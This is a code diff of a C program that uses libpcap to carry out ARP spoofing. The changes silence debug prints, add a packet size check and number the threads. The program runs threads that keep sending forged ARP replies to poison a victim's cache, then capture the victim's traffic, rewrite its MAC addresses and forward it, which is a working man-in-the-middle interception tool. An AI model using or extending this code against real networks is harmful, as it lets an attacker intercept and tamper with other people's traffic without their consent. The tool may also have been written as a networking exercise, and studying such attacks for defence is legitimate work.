@@ -105,9 +105,11 @@ int makeARPpacket(u_char *packet, u_char *dest_mac,u_char *src_mac, u_char *dest
 	return st;
 }
 int arp_send(const u_char *packet, int packet_size, char *dev) {
-	printf("packet size : %d\n",packet_size);
-	print_packet(packet,packet_size);
+//	printf("packet size : %d\n",packet_size);
+	//print_packet(packet,packet_size);
 	char errbuf[PCAP_ERRBUF_SIZE];
+	if( packet_size>1460) return 0;
+	//printf("PESsize : %d\n",PCAP_ERRBUF_SIZE);
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	if(handle == NULL) {
 		printf("device %s open error\n",dev);
@@ -131,7 +133,7 @@ int arp_send_recv(u_char *dest_mac, u_char *s_packet, int s_packet_size, char *d
 		return -1;
 	}
 	while(true) {
-		printf("start capturing packet\n");
+		//printf("start capturing packet\n");
 
 		struct pcap_pkthdr* header;
 		const u_char* r_packet;
@@ -148,12 +150,12 @@ int arp_send_recv(u_char *dest_mac, u_char *s_packet, int s_packet_size, char *d
 		if(eth_type != 0x0806) continue;
 		
 		if(memcmp(r_packet+TARG_IP,my_ip,4)!=0 || memcmp(r_packet+SEND_IP,s_packet+TARG_IP,4)!=0) {
-			printf("wrong packet received\n");
+			//printf("wrong packet received\n");
 			continue;
 		}
 		printf("target MAC received\n");
 		memcpy(dest_mac,r_packet+SEND_MAC,6);
-		print_mac(dest_mac);
+		//print_mac(dest_mac);
 		//sleep(100);			
 		pcap_close(handle);
 		return 0;
@@ -180,7 +182,7 @@ int arp_change(u_char *packet,int *p_size, char* dev, u_char *srcIP, u_char *src
 	printf("MAC address change complete!\n");
 	return 0;
 }
-typedef struct MultiArg{char *dev; u_char *srcIP,*srcMAC,*sendIP,*sendMAC,*targetIP;}MultiArg;
+typedef struct MultiArg{char *dev; u_char *srcIP,*srcMAC,*sendIP,*sendMAC,*targetIP;int t_num;}MultiArg;
 typedef struct packet_s{u_char *packet; int packet_size; char *dev;}packet_s;
 void assign(MultiArg *input, char *dev, u_char *srcIP, u_char *srcMAC, u_char *sendIP, u_char *sendMAC, u_char *targetIP) {
 	input->dev=dev, input->srcIP=srcIP, input->srcMAC=srcMAC, input->sendIP=sendIP, input->sendMAC=sendMAC, input->targetIP=targetIP;
@@ -189,7 +191,8 @@ void *continuous_spoof(void *arg) {
 	packet_s *temp = (packet_s *)arg;
 	while(1) {
 		sleep(1);
-		arp_send(temp->packet,temp->packet_size,temp->dev);
+		if(arp_send(temp->packet,temp->packet_size,temp->dev)) return 0;
+		//print_packet(temp->packet,temp->packet_size);
 	}
 
 }
@@ -224,7 +227,7 @@ void *arp_spoof_thread(void *arg) {
 //	print_packet(packet,packet_size);
 //int arp_send_recv(u_char *dest_mac, u_char *s_packet, int s_packet_size, char *dev, u_char *my_mac, u_char *my_ip) {
 	arp_send_recv(targetMAC,packet,packet_size,dev,srcMAC,srcIP);
-	print_mac(targetMAC);
+//	print_mac(targetMAC);
 //	sleep(10);	
 	arp_change(packet, &packet_size,dev, srcIP, srcMAC, sendIP, sendMAC, targetIP);
 	packet_s argpacket;
@@ -237,8 +240,9 @@ void *arp_spoof_thread(void *arg) {
 
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	printf("start thread %d\n",temp->t_num);
 	while(true) {
-		printf("start capturing packet\n");
+		//printf("start capturing packet\n");
 
 		struct pcap_pkthdr* header;
 		const u_char* r_packet;
@@ -249,12 +253,14 @@ void *arp_spoof_thread(void *arg) {
 		r_size = header->caplen;
 		//print_packet(r_packet,r_size<0x4f?r_size:0x4f);
 		uint16_t eth_type = (r_packet[E_T]<<8)+r_packet[E_T+1];
-		printf("eth_type : %04x\n",eth_type);
+		//printf("eth_type : %04x\n",eth_type);
 		if(memcmp(r_packet+D_M,srcMAC,6)==0 && memcmp(r_packet+S_M,sendMAC,6)==0 && eth_type != 0x0806) {
+			printf("resend packet with MAC change in thread %d\n",temp->t_num);
 			memcpy((void *)(r_packet+D_M),targetMAC,6);
 			memcpy((void *)(r_packet+S_M),srcMAC,6);
-			printf("sending packet\n");
-			print_packet(r_packet,r_size<0x4f?r_size:0x4f);
+//			printf("sending packet\n");
+			printf("r_packet_size : %d\n",r_size);
+			//print_packet(r_packet,r_size<0xff?r_size:0xff);
 			if(arp_send(r_packet,r_size,dev)) {
 				printf("send packet error3\n");
 				return 0;
@@ -263,7 +269,7 @@ void *arp_spoof_thread(void *arg) {
 		}
 		if(eth_type !=0x0806) continue;
 		if(memcmp(r_packet+TARG_MAC,srcMAC,6) != 0 || memcmp(r_packet+TARG_IP,srcIP,4)!=0) {
-			printf("wrong packet received\n");
+			//printf("wrong packet received\n");
 			continue;
 		}
 		
@@ -301,6 +307,7 @@ int main(int argc, char *argv[]) {
 		memcpy(targetIP[i],&temp,4);
 		memcpy(sendMAC[i],"\xff\xff\xff\xff\xff\xff",6);
 		assign(&arguments[i],dev, srcIP, srcMAC, sendIP[i], sendMAC[i], targetIP[i]);
+		arguments[i].t_num=i;
 		printf("creating thread %d...\n",i);
 		if(pthread_create(&thread, NULL, arp_spoof_thread,(void *)&arguments[i])<0) {
 			printf("create thread error\n");
